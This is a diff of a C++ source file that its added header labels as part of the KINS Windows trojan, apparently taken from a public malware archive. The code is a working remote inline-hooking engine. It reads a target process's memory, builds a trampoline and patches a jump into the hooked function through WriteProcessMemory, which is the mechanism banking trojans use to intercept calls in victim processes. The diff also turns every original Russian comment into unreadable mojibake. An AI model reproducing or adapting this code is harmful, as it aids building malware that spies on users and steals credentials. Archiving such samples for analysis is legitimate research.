@@ -1,3 +1,14 @@
+/*
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "wahook.h"
@@ -20,12 +31,12 @@
 #endif
 
 /*
-  Проверяет, сколько доступно байт для изменения.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN process - процесс.
-  IN address - адрес.
+  IN process - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN address - пїЅпїЅпїЅпїЅпїЅ.
 
-  Return     - кол. доступных байт.
+  Return     - пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 */
 static DWORD_PTR checkAvalibleBytes(HANDLE process, void *address)
 {
@@ -34,7 +45,7 @@ static DWORD_PTR checkAvalibleBytes(HANDLE process, void *address)
   if(CWA(kernel32, VirtualQueryEx)(process, address, &mbi, sizeof(MEMORY_BASIC_INFORMATION)) != 0 && mbi.State == MEM_COMMIT && (mbi.Protect & (PAGE_NOACCESS | PAGE_GUARD)) == 0)
   {
     DWORD_PTR tmp = (DWORD_PTR)((LPBYTE)address - (LPBYTE)mbi.BaseAddress);
-    if(mbi.RegionSize > tmp/*параноя*/)avalibeBytes = mbi.RegionSize - tmp;
+    if(mbi.RegionSize > tmp/*пїЅпїЅпїЅпїЅпїЅпїЅпїЅ*/)avalibeBytes = mbi.RegionSize - tmp;
   }
   return avalibeBytes;
 }
@@ -56,23 +67,23 @@ DWORD WaHook::_hook(HANDLE process, void *functionForHook, void *hookerFunction,
   DWORD oldProtect;
   DWORD_PTR avalibeBytes = checkAvalibleBytes(process, functionForHook);
 
-  //Даем все права затрагиваемым страницам.
+  //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   if(avalibeBytes >= OPCODE_MAX_SIZE * 2 && CWA(kernel32, VirtualProtectEx)(process, functionForHook, OPCODE_MAX_SIZE * 2, PAGE_EXECUTE_READWRITE, &oldProtect) != 0)
   {
-    //Считываем старый код.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ.
     BYTE buf[OPCODE_MAX_SIZE * 2 + JMP_ADDR_SIZE];
-    Mem::_set(buf, (char)0x90, sizeof(buf));/*параноя*/
+    Mem::_set(buf, (char)0x90, sizeof(buf));/*пїЅпїЅпїЅпїЅпїЅпїЅпїЅ*/
 
     if(CWA(kernel32, ReadProcessMemory)(process, functionForHook, buf, OPCODE_MAX_SIZE * 2, NULL) == 0)goto END;
 
-    //Читаем опкоды, пока их суммарная длина не достигнит INJECT_SIZE.
+    //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ INJECT_SIZE.
     DWORD_PTR opcodeOffset = 0;
     for(;;)
     {
       LPBYTE currentOpcode = buf + opcodeOffset;
       DWORD currentOpcodeLen = Disasm::_getOpcodeLength(currentOpcode);
 
-      //Неизвестный опкод.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
       if(currentOpcodeLen == (DWORD)-1)
       {
         #if defined(WDEBUG2)
@@ -93,8 +104,8 @@ DWORD WaHook::_hook(HANDLE process, void *functionForHook, void *hookerFunction,
         goto END; 
       }
 #     if !defined _WIN64      
-      //Отностиельные call и jmp.
-      if((currentOpcode[0] == 0xE9 || currentOpcode[0] == 0xE8) && currentOpcodeLen == 1 + sizeof(DWORD)) //FIXME: не уверен для x64.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ call пїЅ jmp.
+      if((currentOpcode[0] == 0xE9 || currentOpcode[0] == 0xE8) && currentOpcodeLen == 1 + sizeof(DWORD)) //FIXME: пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ x64.
       {
 #       if defined(WDEBUG0)
         WDEBUG1(WDDT_INFO, "Relative JMP/CALL(%02X) detected.", currentOpcode[0]);
@@ -111,9 +122,9 @@ DWORD WaHook::_hook(HANDLE process, void *functionForHook, void *hookerFunction,
       if(opcodeOffset >= INJECT_SIZE)break;
     }
 
-    //Сохраняем оригинальные опкоды в originalFunction.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ originalFunction.
     {
-      //Дописываем в конец буфера, jump на продолжение functionForHook.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, jump пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ functionForHook.
       LPBYTE pjmp = buf + opcodeOffset;
 #if defined _WIN64	  
       WRITE_JMP(pjmp, originalFunction/* + opcodeOffset*/, (LPBYTE)functionForHook + opcodeOffset);
@@ -123,17 +134,17 @@ DWORD WaHook::_hook(HANDLE process, void *functionForHook, void *hookerFunction,
       if(CWA(kernel32, WriteProcessMemory)(process, originalFunction, buf, opcodeOffset + JMP_ADDR_SIZE, NULL) == 0)goto END;
     }
 
-    //Пишим инжект в функцию.
+    //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     {
       WRITE_JMP(buf, functionForHook, hookerFunction);
       hotPatchCallback(functionForHook, originalFunction);
       if(CWA(kernel32, WriteProcessMemory)(process, functionForHook, buf, INJECT_SIZE, NULL) == 0)goto END;
     }
 
-    retVal = opcodeOffset + JMP_ADDR_SIZE; //Размер вырезаного фрагмента.
+    retVal = opcodeOffset + JMP_ADDR_SIZE; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
 END:
-    //Восстаналиваем права.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
     CWA(kernel32, VirtualProtectEx)(process, functionForHook, OPCODE_MAX_SIZE * 2, oldProtect, &oldProtect);
   }
   
@@ -146,12 +157,12 @@ bool WaHook::_unhook(HANDLE process, void *hookedFunction, void *originalFunctio
   DWORD oldProtect;
   DWORD_PTR avalibeBytes = checkAvalibleBytes(process, hookedFunction);
 
-  //Даем все права затрагиваемым страницам.
+  //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   if(avalibeBytes >= OPCODE_MAX_SIZE * 2 && CWA(kernel32, VirtualProtectEx)(process, hookedFunction, OPCODE_MAX_SIZE * 2, PAGE_EXECUTE_READWRITE, &oldProtect) != 0)
   {
     if(CWA(kernel32, WriteProcessMemory)(process, hookedFunction, originalFunction, size - JMP_ADDR_SIZE, NULL) != 0)ret = true;
     
-    //Восстаналиваем права.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
     CWA(kernel32, VirtualProtectEx)(process, hookedFunction, OPCODE_MAX_SIZE * 2, oldProtect, &oldProtect);
   }
 
